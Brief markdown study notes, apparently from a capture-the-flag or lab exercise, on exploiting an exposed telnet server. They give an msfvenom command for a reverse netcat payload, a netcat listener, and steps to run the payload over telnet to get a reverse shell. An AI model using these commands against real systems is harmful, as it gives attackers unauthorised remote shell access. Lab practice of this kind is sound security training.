# Exploiting telnet server

- port listed as TCP, with some server response
- create payload with: `msfvenom -p cmd/unix/reverse_netcat lhost=[local ip tun0] lport=4444 R`
  - `-p`: payload
  - `R`: raw output
- create a listener on local host: `nc -lvp 4444`
- connect with: `telnet [ip] [port]`
- copy payload and run: `.RUN [payload]`
- this should give a reverse shell
